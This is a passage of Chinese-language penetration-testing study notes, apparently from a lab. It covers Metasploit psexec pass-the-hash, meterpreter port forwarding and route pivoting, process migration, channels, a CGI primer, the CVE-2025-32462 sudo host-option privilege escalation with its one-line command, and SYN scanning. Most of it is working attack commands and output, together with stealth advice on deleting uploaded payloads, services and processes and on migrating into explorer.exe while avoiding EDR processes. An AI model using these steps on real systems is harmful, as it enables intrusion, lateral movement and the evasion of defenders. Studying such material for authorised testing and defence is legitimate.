[+] 192.168.110.136:445 - Service start timed out, OK if running a different configuration...
[*] Sending stage (200774 bytes) to 192.168.110.136
[*] Meterpreter session 1 opened (...)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM        ← ★ psexec 直接给你 SYSTEM！
```

**注意**：`psexec` 的 payload 是**以服务方式**运行的，所以**默认就是 SYSTEM** —— 不用再 `getsystem`。

**操作细节**

① 哈希格式必须是 `LM:NT`，中间有冒号

```
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0...   ✅
set SMBPass 31d6cfe0d16ae931b73c59d7e0c089c0               ❌ 被当成明文密码
```

**如果手上只有 NTLM 哈希**（没有 LM）：

```
用 aad3b435b51404eeaad3b435b51404ee 占位
        ↓
set SMBPass aad3b435b51404eeaad3b435b51404ee:<你的NTLM>
```

② 域账户**必须**设 `SMBDomain`

```bash
# 本地账户
set SMBDomain .              # 或留空

# 域账户 ★ 一定要填
set SMBDomain CORP
set SMBUser DomainAdmin
set SMBPass <hash>
```

**忘了设 `SMBDomain` 是域环境 PTH 失败的头号原因。**

③ `LHOST` 要自己确认

```bash
show options
# LHOST 可能显示 autodetect 猜的地址
setg LHOST 192.168.110.135    # 手动指定成目标能连回来的那个
```

④ 空密码账户 → 换一个

```
Administrator 的 NTLM = 31d6cfe0d16ae931b73c59d7e0c089c0（空）
        ↓
PTH 会失败（Windows 默认禁止空密码网络登录）
        ↓
换成 test / 其他有密码的账户
```

**最后记得清理（`psexec` 很"响"）**

```
psexec 干了什么：
  ① 往 \\目标\ADMIN$\ 上传了 payload   → 磁盘留文件
  ② 注册了一个 Windows 服务并启动       → 服务列表 + 事件日志留记录
  ③ 服务执行 payload                    → 新进程
```

**活干完之后：**

```bash
meterpreter > rm C:\\Windows\\<服务名>.exe    # 删掉上传的文件
# 或者用 shell 手动清服务和文件
meterpreter > shell
C:\> sc delete <服务名>
```


#### ⑥ 端口转发与内网穿透

##### **`portfwd` —— 把目标的端口映射到本地**

**场景**：目标开着 3389（远程桌面），但它在内网，你直接连不上。

```bash
meterpreter > portfwd add -l 6666 -p 3389 -r 127.0.0.1
[*] Local TCP relay created: :6666 <-> 127.0.0.1:3389     ← 成功

meterpreter > portfwd list
Active Port Forwards
====================
Index  Local              Remote                 Direction
-----  -----              ------                 ---------
1      0.0.0.0:6666       127.0.0.1:3389         Forward

# ★ 到这里就别动这个终端了，去开新终端
```

| 参数           | 含义                                     |
|----------------|------------------------------------------|
| `-l 6666`      | **本地（Kali）**监听端口                 |
| `-p 3389`      | 目标上的目标端口                         |
| `-r 127.0.0.1` | 目标要连的地址（`127.0.0.1` = 目标自己） |

整个指令的意思就是

> " meterpreter在我（Kali）本地开个 6666 端口；以后谁连它，就让目标去连它自己的 3389，我在中间转接"

然后开另一个终端跑 rdesktop

```
rdesktop 127.0.0.1:6666
```

一共需要开2个终端

```
┌─── 终端 1 ──────────────┐     ┌─── 终端 2 ──────────────────┐
│                         │     │                             │
│  msfconsole             │     │  rdesktop 127.0.0.1:6666    │
│  meterpreter >          │     │                             │
│    portfwd add ...      │     │  ← 【真正使用隧道的程序】    │
│                         │     │                             │
│  ←【负责维护隧道】       │     │                             │
│                         │     │                             │
└─────────────────────────┘     └─────────────────────────────┘
```

**整体机制**

```
【你的 RDP 客户端，Linux 上的远程桌面客户端】
   │  发出："我要连 localhost:6666"
   ↓
【Kali 的 6666 端口】  ← meterpreter 在这里守着
   │  meterpreter 接管这个连接，之后这条连接说什么、要什么，都由 msfconsole 决定怎么处理
   ↓
【通过已有的 4444 会话，meterpreter 会话】meterpreter 告诉目标：
   │  "你开个 socket，去连 127.0.0.1:3389"，目标主机已经被我们控制了，可以被我们利用。
   ↓
【目标机器】
   │  照做 → 连上自己的 3389（本地连接，Windows 上的"远程桌面"服务）
   ↓
【目标的 3389】返回数据
   │
   ↓ 目标把返回的数据交回给 meterpreter
【meterpreter】
   │  通过 4444 会话送回 Kali
   ↓
【Kali 的 6666 端口】
   │  把数据交给你的 RDP 客户端，meterpreter 的位置太完美了 —— 它左手连着 3389，右手连着你的 4444。
   ↓
【你的 RDP 客户端】
   收到响应 —— 感觉就像【直接连到了目标的 3389】🎯
```

##### **`route` —— 把整个网段路由进隧道（内网渗透核心）**

```
meterpreter > background		# 先离开会话（route 命令不在会话里）
msf6 > route add 10.10.10.0/24 1        # 把 10.10.10.0/24 路由到 session 1,以后 MSF 里凡是发往 10.10.10.0/24 这个网段的数据，都从 session 1 那台机器绕过去。

msf6 > route print		# 查看 MSF 的路由表
IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.10.10.0         255.255.255.0      Session 1

[*] There are currently 1 active routes in the routing table.

发往 10.10.10.0/24 的流量  →  经过 Session 1
```

**之后就能直接扫目标的内网了**：

```
msf6 > use auxiliary/scanner/portscan/tcp		# 选 MSF 自带的 TCP 端口扫描器
msf6 > set RHOSTS 10.10.10.0/24		# 目标是一整个 C 段
msf6 > run
```

**必须用 MSF 的扫描器，不能用系统 nmap** —— 因为 `route add` 只改了 **MSF 内部的路由表**， 只有 MSF 的模块能借 `session 1` 穿到内网。

**`portfwd` vs `route` 的区别**：

- `portfwd` → 转发**单个端口**，给"其他工具"用
- `route` → 转发**整个网段**，给"MSF 自己的模块"用

#### ⑩ 会话管理

**会话（session）= MSF 和一台被入侵机器之间，已建立且能持续交互的【连接记录】。**

**你每拿下一个 shell 或 meterpreter，MSF 就把它登记为一个"会话"，并编个号。**

| 命令              | 作用                                            |
|-------------------|-------------------------------------------------|
| `background`      | **把会话挂到后台**（会话不死，回到 msf 提示符） |
| `sessions -l`     | 列出所有会话                                    |
| `sessions -i 1`   | 进入会话 1                                      |
| `sessions -k 1`   | 杀掉会话 1                                      |
| `migrate <PID>`   | **迁移进程**（稳定性关键）                      |
| `channel -i <id>` | 进入 `execute -c` 建的通道                      |
| `exit` / `quit`   | 结束会话                                        |

##### `migrate` —— 拿到会话后第一件该做的事

**它做什么？—— 搬家**

```
迁移前：
   ┌─ hack.exe ──────────┐
   │   meterpreter 住这里 │  ← 你的会话在这个进程里
   └─────────────────────┘

   migrate 1364
        ↓
迁移后：
   ┌─ hack.exe ──────────┐        ┌─ explorer.exe ──────┐
   │   （空了）           │        │   meterpreter 搬来了 │  ← 会话现在在这
   └─────────────────────┘        └─────────────────────┘
```

**meterpreter 从"当前进程"注入到"另一个进程"里。**

---

**为什么要迁移？—— 三个原因**

① 稳定性 ⭐ 最重要

```
你打漏洞拿到的会话，往往寄生在一个【临时进程】里
        ↓
比如漏洞利用时创建的那个进程
        ↓
一旦它退出（服务重启、用户关窗口、系统清理）
        ↓
会话立刻断 💥
        ↓
迁到 explorer.exe（用户登录期间一直跑）
        ↓
稳定多了 ✅
```

② 隐蔽性

```
迁移前：
   任务管理器里有个可疑的 hack.exe        ← 🚨 一眼看见
   而且这个文件还躺在磁盘上

迁移后：
   meterpreter 藏在 explorer.exe 里
   原进程可以 kill 掉
        ↓
   进程列表里看不出异常 ✅
```

③ 改变身份（高级用法）

```
你是 SYSTEM 身份
        ↓
但 SYSTEM 访问网络时会变成"计算机账户"（权限低）
        ↓
迁到一个【普通用户的 explorer.exe】
        ↓
你现在是那个用户了
        ↓
✅ 能访问他的网络映射盘、邮件、浏览器保存的密码
```

---

**怎么选要迁到哪个进程**

```
meterpreter > getpid               # ① 先看我在哪
Current pid: 2020

meterpreter > ps                   # ② 找更好的归宿
 PID   PPID  Name          Arch  Session  User                    Path
 ---   ----  ----          ----  -------  ----                    ----
 1364  1328  explorer.exe  x64   0        CHETAN-BZW4PJ57\Owner   C:\WINDOWS\Explorer.EXE
 2020  1364  hack.exe      x86   0        CHETAN-BZW4PJ57\Owner   C:\...\hack.exe
                            ↑
                    注意这个 Arch 列（位数）
```

**选择原则：**

| ✅ 好目标                                   | ❌ 避免                         |
|---------------------------------------------|---------------------------------|
| **`explorer.exe`** ⭐（用户登录期间一直在） | 你自己的 payload 进程（会退出） |
| 长期运行的 `svchost.exe`                    | **位数不匹配**的进程            |
| **位数匹配**的进程                          | 杀软 / EDR 相关进程             |
| 同名多个时，选 PID 小的（通常活得更久）     | `lsass.exe`（敏感，可能被保护） |
| 不起眼的系统进程                            | 名字很"响"的进程                |

**⚠️ 位数必须匹配**

```
32 位 meterpreter  →  只能迁到 32 位进程
64 位 meterpreter  →  只能迁到 64 位进程
        ↓
用 ps 输出里的 Arch 列确认（x86 / x64）
        ↓
不匹配会报错：
   [-] Cannot migrate to a process with a different architecture
```

---

**完整流程**

```bash
# ① 我在哪？
meterpreter > getpid
Current pid: 2020

# ② 找更好的归宿
meterpreter > ps
#  2020 → hack.exe       🚨 危险，要搬走
#  1364 → explorer.exe   ✅ 稳定，搬这儿

# ③ 搬家
meterpreter > migrate 1364
[*] Migrating to 1364...
[*] Migration completed successfully.

# ④ 验证
meterpreter > getpid
Current pid: 1364              ← ✅ 数字变了，成功

# ⑤ （可选）清理原进程
meterpreter > kill 2020        # 干掉那个可疑的 hack.exe
```

---

**注意**

| 坑                     | 说明                                                |
|------------------------|-----------------------------------------------------|
| **迁移瞬间可能断线**   | 本质是"断-连"过程，网络差时容易失败                 |
| **迁到即将退出的进程** | 会话秒断                                            |
| **位数不匹配**         | 直接报错（先看 `ps` 的 Arch 列）                    |
| **迁移后原进程还在**   | 只是里面没有 meterpreter 了，想减少痕迹要 `kill` 它 |

> ⚠️ **迁移后别忘了**：如果 payload 文件还在磁盘上，`kill` 进程只是停掉运行，**文件还得 `rm` 删掉**。

##### `channel -i <id>` —— 进入通道

**通道 = meterpreter 和目标上某个交互式程序之间的"输入输出流"。**

```
meterpreter
    │
    ├─ 通道 1：某个 cmd.exe 的 stdin/stdout
    ├─ 通道 2：另一个 powershell.exe 的 I/O
    └─ 通道 3：……
```

---

**为什么要这个机制？**

**因为 meterpreter 可能要同时管好几个交互式程序**：

```
① 你 execute -c 起了个 cmd.exe        → 通道 3
② 又 execute -c 起了个 powershell      → 通道 5
③ 之前 shell 建的还在                  → 通道 7
        ↓
你想在它们之间切换 → 用 channel
```

---

**通道是怎么产生的？**

**主要是 `execute` 命令：**

```bash
# ★ -c（channelized）：只创建通道，【不自动进入】
meterpreter > execute -f cmd.exe -c
Process 196 created.
Channel 3 created.              ← 通道建好了
meterpreter >                   ← 但你【还在 meterpreter 里】
```

**这时候你还没进 cmd** —— 得自己进去

```
meterpreter > channel -i 3
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Owner\Desktop>        ← ✅ 现在进来了
```

---

**对比：`-c` vs `-i`**

```bash
# -c：建通道，手动进
meterpreter > execute -f cmd.exe -c
Process 196 created.
Channel 3 created.
meterpreter >                   ← 需要 channel -i 3

# -i：建通道，自动进
meterpreter > execute -f cmd.exe -i
Process 196 created.
Channel 3 created.
Microsoft Windows XP [...]      ← 直接就进来了
C:\>
```

| 参数     | 行为                               |
|----------|------------------------------------|
| **`-c`** | 建通道，**手动**用 `channel -i` 进 |
| **`-i`** | 建通道，**自动**进入               |

#### cgi介绍

CGI（Common Gateway Interface，通用网关接口）是 Web 服务器与外部程序之间“怎么对话”的约定。它不是语言，也不是程序，而是一份协议规范：只要你的程序按照这个规则收发数据，Apache、Nginx 等服务器就能把它接上。

**通俗理解**

> **CGI 就是“网页服务器遇到自己不会算的活儿时，转身去敲后厨小窗口的那套规矩”。**

**用餐厅来打比方**

把网站想成一家餐厅：

- **Web 服务器（Apache/Nginx）= 前厅服务员**
- **静态网页（.html/.jpg）= 货架上做好的菜**，顾客要什么，服务员直接端走，不经过厨房
- **CGI 程序 = 后厨**

顾客点的菜如果货架上没有（比如要“查我的订单”“算 1+1”“登录验证”），服务员自己不会做，就得请后厨出手。

**CGI 就是前厅和后厨之间约定的“下单规矩”**：

| 环节                   | 餐厅里的说法               | 技术上的说法                                                 |
|------------------------|----------------------------|--------------------------------------------------------------|
| 顾客的要求怎么递进后厨 | 写在小纸条上，从窗口递进去 | 服务器把请求信息塞进**环境变量**，POST 数据从 **stdin** 递进去 |
| 后厨怎么做             | 后厨看完纸条现做           | CGI 程序读环境变量、读 stdin，自己算                         |
| 做好的菜怎么递出来     | 从窗口端出来，盘子上贴标签 | 程序往 **stdout** 写：先写响应头，空一行，再写正文           |

### CVE-2025-32462-Linux sudo本地提权漏洞

#### 漏洞介绍

sudo 是 Linux 系统中管理权限的核心工具，允许授权用户临时获取 root 或其他用户权限执行命令，既保障系统安全又便于操作审计。近日，Linux sudo 工具公开存在两个紧密关联的本地提权漏洞（CVE-2025-32462 / CVE-2025-32463）。主流 Linux 发行版默认配置下，攻击者可利用这两个漏洞从普通用户权限提升至 root 权限。CVE-2025-32462 Linux sudo 本地权限提升漏洞在于 sudo 的 -h（--host）选项存在缺陷，该选项本应与 -l（--list）配合使用来查询远程主机权限，但实际未严格限制其仅用于查询功能，导致攻击者可能结合命令执行或文件编辑操作实现本地提权。

#### 影响范围

CVE-2025-32462 1.8.8 < Sudo版本 <= 1.9.17

![image-20261029100522697](image-20261029100522697.png)

#### 漏洞原理

本机名 jadenkali

用户名 kalitest

**sudo 把"这条规则是否适用于本机"的判据(host 字段),交给了发起 sudo 的那个人自己填。**

**1. sudoers 的规则本来有四个字段**

```
谁          在哪台机器    以谁的身份    能跑什么
kalitest    kalihost     (root)        ALL
 └你         └那台跳板机    └变成谁      └所有命令
```

我输入

```bash
sudo id
```

四个字段里,**你只打了其中一个**,另外三个是"自动补上的",不是隐藏,是**默认值**。

**四栏的实际来源**

| 栏位     | 你打了什么 | 值从哪来                                                     |
|----------|------------|--------------------------------------------------------------|
| 谁       | 没打       | **内核给的**:sudo 自己就是以 kalitest 身份被启动的,`getuid()` 一读就知道 |
| 在哪     | 没打       | **内核给的**:`gethostname()` 读出 `jadenkali`                |
| 以谁身份 | 没打       | **默认值 `root`**(要用别的加 `-u`)                           |
| 干什么   | `id`       | **唯一由你手打的一项**                                       |

所以 `sudo id` 展开成完整请求是:

```
在 jadenkali 上,用户 kalitest 请求以 root 身份执行 /usr/bin/id
```

---

为什么要有"在哪台机器"这一栏?因为一套 sudoers 要发到几十上百台机器上(LDAP/SSSD 集中管理时更是全公司共享一份)。

规则必须写成"kalitest 在 kalihost 上才可以 root",换到别的机器上这一行就不该生效。

你本机叫 `jadenkali`, `sudoers` 表里没有"kalitest 在 jadenkali"这一行。所以:

```bash
sudo -l   →  对不起,用户 kalitest 不能在 jadenkali 上运行 sudo。
```

你在本机没有任何 sudo 权限。

从这个我们就可以摸清楚 sudo 提权的原理

1. sudo 本身不含任何权限，

**它只做一件事**:**读取 `/etc/sudoers`,拿里面的规则当唯一依据。**所以 sudo 不是"权限系统",而是"策略执行器"。权限的真实载体是一份文本文件。这也直接推出一个结论:谁能写 sudoers,谁就是 root——文件是 600、属主 root,这不是保护 sudo,是保护权限源头。

2. 授权是一次"上下文匹配",不是身份认证

 规则是四个字段,而这四个字段本质上是四个匹配条件:

```
谁(kalitest)  在哪(kalihost)  以谁身份(root)  干什么(ALL)
   ↑ 调用者        ↑ 主机名         ↑ 目标身份       ↑ 请求的命令
```

sudo 运行时的动作是:把**当前这次请求的上下文**逐项和每条规则比对,匹配上就放行,匹配不上就 `Sorry`。所以 sudoers 的语义是**"命中即允许"的允许列表**,不是黑名单——没有哪条规则说"禁止",不被任何行覆盖就等于禁止。

3. sudo 是"身份代理",不是"权限拦截器"

你请求"以 root 身份执行 id" → sudo 核对策略 → 策略说可以 → sudo 用自己 setuid root 的特权 setuid 成 root,然后替你执行 id。

命令是 sudo 替你跑的,不是"你被允许跑"。所以一旦策略核对被绕过,`(root)` 那个字段不是"给你开了个口子",而是**直接把 root 身份代理权给你了**——这是原理三最危险的地方:权限的授予是"全有或全无"的身份切换,没有中间态、没有沙箱。

4. Host 字段说明 sudo 的设计目标是"集中可管",不是"单机最小权限"

sudo 真正的使用场景:一个中心的、可审计的策略文件,分发到多台异构机器

**2.`-h` 的本意只是"查一下另一台机器上我能干什么"**

我人坐在 jadenkali,想知道自己在跳板机 kalihost 上有什么权限,于是:

```bash
sudo -l -h kalihost
```

`-h kalihost` 的意思是"这次判断,把'我在的这台机器'当成 kalihost"。

整体的命令，它只**打印**结果,不改任何东西,所以无害——**因此它被设计成必须搭配 `-l`**

**3. 缺陷点**

sudo 的2种模式

```
收到命令
   ↓
查表:拿四栏去对规则        ← 两种模式共用这一套
   ↓
算出结果(允许 / 拒绝)
   ↓
   分岔 ─┬─ 查询模式(-l):把结果打印出来 → 结束
         └─ 执行模式(命令):按结果切身份 → 真的执行
```

**"用 kalihost 去进行一次授权判断，得出允许还是拒绝"发生在分岔之前**

分岔那一刻不产生任何判断。 它不重新考虑、不复核、不征求第二意见——只是决定"这份已经写好的结论,是拿去打印,还是拿去执行"。

就出现了漏洞：

sudo 允许用户通过 -h 指定"我在哪台主机",而该值未经校验直接进入 sudoers 规则匹配;由于匹配发生在模式分岔之前、之后无任何环节复核,用户可借此让一条为其他主机配置的规则在本机生效,从而获得该规则授予的 root 权限。

**三要素**

> 1. **来源不可信**:"我在哪"由一个用户可填的参数决定
> 2. **直接影响授权**:这一栏是规则匹配的条件之一
> 3. **下游无复核**:分岔之后没有任何环节有能力推翻结论

**设计初衷:设计初衷:`-h` 只许配 `-l`(只读查询)。 实际情况:旧版本没在执行路径上拦它,`-h` 也能配命令。 后果:用户可以自定义"sudo 认为我在哪台主机",从而让一条**为其他主机配置的规则**在本机生效,并**借用该规则授予的(root)权限**执行命令。**

于是这条被放行了:

```bash
sudo -h kalihost id
```

执行过程:

1. sudo 问:"这次按哪台机器查表?" → 你填的 `kalihost`
2. 查表 → 命中 `kalitest kalihost = (root) ALL` → **授权通过**
3. sudo 说:"好,以 root 执行 `id`" → **命令在 jadenkali 本地以 root 跑起来**

**注意最关键的一点**:**命令从头到尾都在本机执行,`-h` 从来不改变执行位置**,它只改了"查表时用哪个机器名"。所以这不是"远程功能有漏洞",而是纯粹的本地提权。

### syn扫描

扫描器向目标主机的一个端口发送请求连接的SYN包，扫描器在收到SYN/ACK后，不是发送的ACK应答而是发送RST包请求断开连接。这样，三次握手就没有完成，无法建立正常的TCP连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有root权限。

TCP connect端口扫描服务端与客户端建立连接成功（目标端口开放）过程：

① Client端发送SYN；

② Server端返回SYN/ACK，表明端口开放；

③ Client端返回ACK，表明连接已建立；

④ Client端主动断开连接。

![image-20261014232815100](image-20261014232815100.png)

TCP connect端口扫描服务端与客户端未建立连接成功（目标端口关闭）过程：

① Client端发送SYN；

② Server端返回RST/ACK，表明端口未开放。

端口开放：

1、Client发送SYN ；

2、Server端发送SYN/ACK ；

3、Client发送RST断开（只需要前两步就可以判断端口开放）。

端口关闭：

1、Client发送SYN ；

2、Server端回复RST（表示端口关闭）。

优点：

SYN扫描要比TCP Connect()扫描隐蔽一些，SYN仅仅需要发送初始的SYN数据包给目标主机，如果端口开放，则相应SYN-ACK数据包；如果关闭，则响应RST数据包；

使用说明

```
use auxiliary/scanner/portscan/syn
show options
设置一个要扫描的ip。
set rhosts 192.168.xxx.xxx
再设置一个线程，这里默认的线程是1，我们设置成100
set threads 100
run
```
